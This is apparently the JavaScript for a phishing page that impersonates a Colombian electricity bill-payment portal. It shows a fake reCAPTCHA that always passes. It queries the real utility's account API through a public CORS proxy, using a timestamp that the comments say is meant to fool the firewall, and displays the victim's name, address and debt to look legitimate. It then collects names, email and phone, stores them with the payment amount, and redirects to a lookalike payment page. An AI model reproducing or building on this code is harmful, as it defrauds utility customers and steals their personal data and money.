// --- 1. Lógica del Menú Hamburguesa ---
const hamburgerBtn = document.getElementById('hamburgerBtn');
const hamburgerBtnDesktop = document.getElementById('hamburgerBtnDesktop'); 
const sidebar = document.getElementById('sidebar');

const toggleSidebar = () => {
    if (window.innerWidth <= 768) {
        sidebar.classList.toggle('mobile-open');
    } else {
        sidebar.classList.toggle('hidden');
    }
};

if(hamburgerBtn) hamburgerBtn.addEventListener('click', toggleSidebar);
if(hamburgerBtnDesktop) hamburgerBtnDesktop.addEventListener('click', toggleSidebar);

// --- 2. Lógica del ReCAPTCHA ---
const checkboxContainer = document.getElementById('checkboxContainer');
const fakeCheckbox = document.getElementById('fakeCheckbox');
const spinner = document.getElementById('spinner');
const checkmark = document.getElementById('checkmark');
let isChecked = false;

if (checkboxContainer) {
    checkboxContainer.addEventListener('click', () => {
        if(isChecked) return; 
        fakeCheckbox.style.display = 'none';
        spinner.style.display = 'block';
        setTimeout(() => {
            spinner.style.display = 'none';
            checkmark.style.display = 'block';
            isChecked = true;
        }, 1200);
    });
}

// --- 3. LÓGICA PRINCIPAL (VERSIÓN DEFINITIVA ANTI-403) ---
const btnPagar = document.getElementById('btnPagar');
const whitePanel = document.getElementById('whitePanel');
const originalTitleStrip = document.getElementById('originalTitleStrip');
const inputNic = document.getElementById('inputNicReal');

if (btnPagar) {
    btnPagar.addEventListener('click', async () => {
        
        if(!inputNic || inputNic.value.trim() === '') {
            alert("Por favor, ingrese el NIC.");
            return;
        }

        if(!isChecked) {
            alert("Por favor confirme que no es un robot.");
            return;
        }

        originalTitleStrip.style.display = 'none';
        whitePanel.innerHTML = `<div class="full-loader-container"><div class="big-loader"></div><p style="text-align:center; margin-top:10px;">Validando con el servidor...</p></div>`;

        try {
            const nic = inputNic.value.trim();
            // URL que devuelve JSON
            const targetUrl = `https://caribesol.facture.co/DesktopModules/Gateway.Pago.ConsultaAnonima/API/ConsultaAnonima/getPolizaOpen?cd_poliza=${nic}`;
            
            // Usamos AllOrigins con un número aleatorio al final para engañar al firewall
            const finalUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(targetUrl)}&timestamp=${new Date().getTime()}`;

            const response = await fetch(finalUrl);
            
            if (!response.ok) throw new Error("Error de conexión con el puente de datos.");

            const jsonWrapper = await response.json();
            
            // Si el contenido está vacío o es nulo
            if (!jsonWrapper.contents) {
                throw new Error("El servidor no devolvió información. Intente en 1 minuto.");
            }

            const data = JSON.parse(jsonWrapper.contents);

            if (!data.ACCOUNTS) {
                throw new Error("El NIC ingresado no es válido o no tiene deudas.");
            }

            const info = data.ACCOUNTS;
            const deudaTotalNum = parseFloat(info.ADJUST_BALANCE) || 0;
            
            let valorMesNum = 0;
            if (info.INVOICES && info.INVOICES.length > 0) {
                valorMesNum = parseFloat(info.INVOICES[info.INVOICES.length - 1].ADJUST_BALANCE) || 0;
            }

            if (deudaTotalNum > 0) {
                whitePanel.innerHTML = `
                <div class="invoice-view">
                    <div class="invoice-header"><h3>DETALLES DE SU FACTURA</h3></div>
                    <div style="text-align:center; padding:15px; background:#f4f7f6; border-radius:10px; margin-bottom:20px;">
                        <span style="color:#004a99; font-weight:bold; font-size:1.1em; display:block;">${data.NAME}</span>
                        <span style="color:#666; font-size:0.9em;">${info.COLLECTION_ADDRESS}</span>
                    </div>
                    <div class="invoice-form-grid">
                        <div class="required-note">* Indica campo requerido</div>
                        <div class="invoice-input-group"><label class="invoice-label">No. identificación <span>*</span></label><input type="text" class="invoice-field" id="numId" value="${nic}"></div>
                        <div class="invoice-input-group"><label class="invoice-label">Nombres <span>*</span></label><input type="text" class="invoice-field" id="nombres"></div>
                        <div class="invoice-input-group"><label class="invoice-label">Apellidos <span>*</span></label><input type="text" class="invoice-field" id="apellidos"></div>
                        <div class="invoice-input-group"><label class="invoice-label">Correo <span>*</span></label><input type="email" class="invoice-field" id="correo"></div>
                        <input type="hidden" id="direccion" value="${info.COLLECTION_ADDRESS}">
                        <div class="invoice-input-group"><label class="invoice-label">Celular <span>*</span></label><input type="text" class="invoice-field" id="celular"></div>
                    </div>
                    <div class="payment-cards-grid">
                        <div class="payment-card">
                            <div class="pay-card-title">Pago Mensual</div>
                            <div class="pay-card-amount">$ ${valorMesNum.toLocaleString('es-CO')}</div>
                            <button class="btn-card-action btn-blue-dark" onclick="guardarYRedirigir('${valorMesNum}', 'mensual')">PAGAR MES</button>
                        </div>
                        <div class="payment-card">
                            <div class="pay-card-title">Pago Total</div>
                            <div class="pay-card-amount">$ ${deudaTotalNum.toLocaleString('es-CO')}</div>
                            <button class="btn-card-action btn-teal" onclick="guardarYRedirigir('${deudaTotalNum}', 'total')">PAGAR TOTAL</button>
                        </div>
                    </div>
                    <div class="invoice-footer">
                        <div class="terms-check"><input type="checkbox" id="aceptaCheck" checked><span>Acepto términos y condiciones.</span></div>
                        <button class="btn-cancel" onclick="location.reload()">CANCELAR</button>
                    </div>
                </div>`;
            } else {
                alert("No se encontraron deudas para este NIC.");
                location.reload();
            }

        } catch (error) {
            console.error("Error detallado:", error);
            alert("Error al consultar: " + error.message);
            location.reload();
        }
    });
}

window.guardarYRedirigir = function(monto, tipo) {
    const nom = document.getElementById('nombres').value;
    const ape = document.getElementById('apellidos').value;
    const mail = document.getElementById('correo').value;
    const check = document.getElementById('aceptaCheck');

    if(!nom || !ape || !mail || !check.checked) {
        alert("Por favor complete sus datos y acepte los términos.");
        return;
    }

    const datos = {
        nombreCompleto: nom + " " + ape,
        numId: document.getElementById('numId').value,
        correo: mail,
        montoPagar: parseInt(monto),
        referencia: "REF" + Math.floor(Math.random() * 999999)
    };
    localStorage.setItem('datosFactura', JSON.stringify(datos));
    window.location.href = 'portalpagos.portalfacture.com.html';
};
